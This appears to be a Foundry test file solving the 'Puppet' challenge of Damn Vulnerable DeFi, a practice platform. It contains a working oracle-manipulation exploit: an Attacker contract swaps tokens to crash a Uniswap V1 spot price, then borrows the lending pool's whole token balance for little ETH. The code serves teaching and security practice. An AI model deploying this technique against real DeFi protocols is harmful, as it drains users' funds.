// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract Attacker {
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    DamnValuableToken token;
    IUniswapV1Exchange uniswapV1Exchange;
    PuppetPool lendingPool;
    address owner;

    constructor(
        address _token,
        address _uniswapV1Exchange,
        address _lendingPool
    ) payable {
        token = DamnValuableToken(_token);
        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
        lendingPool = PuppetPool(_lendingPool);
        owner = msg.sender;
    }

    function attack(address _recovery) public {
        // 1. Step approve the uniswapV1Exchange to spend the spend our tokens
        token.approve(address(uniswapV1Exchange), type(uint256).max);

        // 2. Step swap the tokens for ETH to break the calculated oracle price
        uniswapV1Exchange.tokenToEthSwapInput(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1,
            block.timestamp + 300
        );
        uint256 depositRequired = lendingPool.calculateDepositRequired(
            POOL_INITIAL_TOKEN_BALANCE
        );

        // 3. Step borrow the tokens and send it to the recovery address
        lendingPool.borrow{value: depositRequired}(
            POOL_INITIAL_TOKEN_BALANCE,
            _recovery
        );
    }

    function withdraw() public {
        (bool success, ) = address(owner).call{value: address(this).balance}(
            ""
        );
        require(success, "Withdraw failed");
    }

    receive() external payable {}
}

contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy a exchange that will be used as the factory template
        IUniswapV1Exchange uniswapV1ExchangeTemplate = IUniswapV1Exchange(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/builds/uniswap/UniswapV1Exchange.json"
                )
            )
        );

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapV1Factory(
            deployCode("builds/uniswap/UniswapV1Factory.json")
        );
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy token to be traded in Uniswap V1
        token = new DamnValuableToken();

        // Create a new exchange for the token
        uniswapV1Exchange = IUniswapV1Exchange(
            uniswapV1Factory.createExchange(address(token))
        );

        // Deploy the lending pool
        lendingPool = new PuppetPool(
            address(token),
            address(uniswapV1Exchange)
        );

        // Add initial token and ETH liquidity to the pool
        token.approve(
            address(uniswapV1Exchange),
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(
                1e18,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(
            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppet() public checkSolvedByPlayer {
        uint ethRequired = _calculateTokenToEthInputPrice(
            PLAYER_INITIAL_TOKEN_BALANCE,
            UNISWAP_INITIAL_TOKEN_RESERVE,
            UNISWAP_INITIAL_ETH_RESERVE
        );

        uint requiredEth = PLAYER_INITIAL_ETH_BALANCE - ethRequired;

        Attacker attacker = new Attacker{value: requiredEth}(
            address(token),
            address(uniswapV1Exchange),
            address(lendingPool)
        );

        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
        // before the attack the expected amount of Eth is 200000 Eth
        // after we make the swap the expected amount of Eth is around 19 Eth

        attacker.attack(recovery);
        attacker.withdraw();
    }

    // Utility function to calculate Uniswap prices
    function _calculateTokenToEthInputPrice(
        uint256 tokensSold,
        uint256 tokensInReserve,
        uint256 etherInReserve
    ) private pure returns (uint256) {
        return
            (tokensSold * 997 * etherInReserve) /
            (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All tokens of the lending pool were deposited into the recovery account
        assertEq(
            token.balanceOf(address(lendingPool)),
            0,
            "Pool still has tokens"
        );
        assertGe(
            token.balanceOf(recovery),
            POOL_INITIAL_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
